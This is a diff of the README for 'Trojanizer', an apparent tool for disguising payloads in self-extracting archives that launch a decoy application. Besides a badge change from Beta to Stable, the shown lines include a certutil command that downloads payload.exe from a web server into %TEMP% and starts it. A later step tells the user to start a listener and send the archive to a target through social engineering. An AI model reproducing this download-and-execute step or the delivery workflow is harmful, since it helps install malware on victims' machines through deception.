@@ -1,5 +1,5 @@
 [![Version](https://img.shields.io/badge/Trojanizer-v1.1-brightgreen.svg?maxAge=259200)]()
-[![Stage](https://img.shields.io/badge/Release-Beta-orange.svg)]()
+[![Stage](https://img.shields.io/badge/Release-Stable-brightgreen.svg)]()
 [![Build](https://img.shields.io/badge/Supported_OS-Ubuntu,Kali,Mint,Parrot-blue.svg)]()
 [![AUR](https://img.shields.io/aur/license/yaourt.svg)]()
 
@@ -114,7 +114,7 @@
 
     4º - running trojanizer tool
          PAYLOAD TO BE COMPRESSED => any_file (it will not matter what you compress)
-         script.bat (thats going to execute: any_file) => any_legit_appl.exe (to be executed as decoy)
+         EXECUTE THE FOLLOW APPL/SCRIPT => any_legit_appl.exe (to be executed as decoy appl)
          PRESETUP FUNTION => cmd.exe /c certutil -urlcache -split -f 'http://webserver/payload.exe', '%TEMP%\\payload.exe'; Start-Process '%TEMP%\\payload.exe'
 
     5º - start a listenner, and send the sfx archive to target using social enginnering
